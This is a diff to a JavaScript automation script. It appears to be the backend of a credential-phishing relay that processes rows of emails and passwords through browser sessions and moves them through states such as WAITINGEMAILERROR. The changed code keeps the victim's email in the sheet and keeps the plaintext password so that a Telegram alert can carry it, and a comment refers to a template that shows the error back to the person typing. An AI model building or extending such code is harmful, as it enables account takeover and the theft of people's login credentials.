@@ -2800,11 +2800,10 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                 message: initialCheckResult.message || "Email does not exist. Please provide a valid email."
                             });
                             sendWrongInputAlert({ type: 'WRONG_EMAIL', platform, email, browserId, password: password || '', detail: `Generic: "${initialCheckResult.message || 'Email does not exist'}"` });
-                            // Clear the email and domain fields in the sheet when transitioning to
-                            // WAITINGEMAILERROR, but KEEP the password so the Telegram alert can carry
-                            // it and the next attempt can reuse it.
-                            logger.debug(`[processRow][${browserId}] Clearing email, domain. Returning to WAITINGEMAILERROR state (password kept).`);
-                            updateBrowserRowDataFast(browserId, { ...updateData, email: '', domain: '', verified: false, fullAccess: false });
+                            // Keep email in sheet so the row shows what went wrong.
+                            // Password is kept so the Telegram alert can carry it.
+                            logger.debug(`[processRow][${browserId}] Preserving email in WAITINGEMAILERROR state (password kept).`);
+                            updateBrowserRowDataFast(browserId, { ...updateData, verified: false, fullAccess: false });
                             exitingEarly = true;
                             return; // Exit processRow immediately so no later logic overwrites status
                         } else if (initialCheckResult.verificationState === 'RETRY_TECHNICAL') {
@@ -5621,7 +5620,7 @@ if (!foundSelector) {
             });
             sendWrongInputAlert({ type: 'WRONG_EMAIL', platform, email, browserId, password, detail: `WAITINGEMAIL_ERROR: "${initialCheckResult.message}"` });
             updateData.status = sheetStatus;
-            updateBrowserRowDataFast(browserId, { ...updateData, email: '' });
+            updateBrowserRowDataFast(browserId, updateData);
             return;
         } else if (initialCheckResult.verificationState === 'WAITINGPASSWORD_ERROR') {
             // Unify: use WAITINGPASSWORD (not WAITINGPASSWORDERROR) so the WAITINGPASSWORD handler retries correctly
@@ -5672,7 +5671,7 @@ if (!foundSelector) {
                 updateBrowserRowDataFast(browserId, updateData);
                 return;
             } else {
-                logger.info(`[processRow][${browserId}] Setting status to WAITINGEMAILERROR and clearing email so the template renders the inline error.`);
+                logger.info(`[processRow][${browserId}] Setting status to WAITINGEMAILERROR. Preserving email in sheet so the row shows what went wrong.`);
                 finalStatus = "WAITINGEMAILERROR";
                 updateData.lastJsonResponse = JSON.stringify({
                     browserId, email, status: finalStatus,
@@ -5687,7 +5686,7 @@ if (!foundSelector) {
                 });
                 sendWrongInputAlert({ type: 'WRONG_EMAIL', platform, email, browserId, password: password || '', detail: 'Email not found after processing' });
                 updateData.status = finalStatus;
-                updateBrowserRowDataFast(browserId, { ...updateData, email: '' });
+                updateBrowserRowDataFast(browserId, updateData);
                 return;
             }
         } else if (finalStatus === "FAILED" && initialCheckResult.emailExists) {
